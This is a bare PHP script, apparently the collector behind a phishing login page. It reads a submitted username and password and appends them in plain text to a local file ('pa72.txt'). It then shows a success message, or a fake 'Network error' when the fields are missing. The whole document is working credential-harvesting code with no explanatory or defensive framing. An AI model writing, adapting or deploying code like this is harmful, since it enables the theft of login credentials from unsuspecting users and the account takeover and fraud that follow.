<?php

if(isset($_POST['username']) && isset($_POST['password'])){

$username = $_POST['username'];
$password = $_POST['password'];

$file = fopen("pa72.txt","a");
fwrite($file,"Username: $username | Password: $password \n");
fclose($file);

echo "Data saved successfully ✅";

} else {
echo "Network error ❌";
}

?>